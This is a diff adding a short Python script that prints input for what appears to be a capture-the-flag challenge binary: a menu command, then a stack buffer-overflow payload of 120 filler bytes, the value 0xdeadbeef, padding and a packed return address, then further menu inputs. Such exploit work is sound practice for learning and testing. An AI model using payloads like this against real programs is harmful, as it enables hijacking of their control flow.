@@ -1,0 +1,5 @@
+print("add_candidate")
+print("A"*120+'\xef\xbe\xad\xde\x41\x41\x41\x41'+'B'*8+'\x5d\x61\x55\x56')
+print("Test")
+print("Boss")
+print("exit")
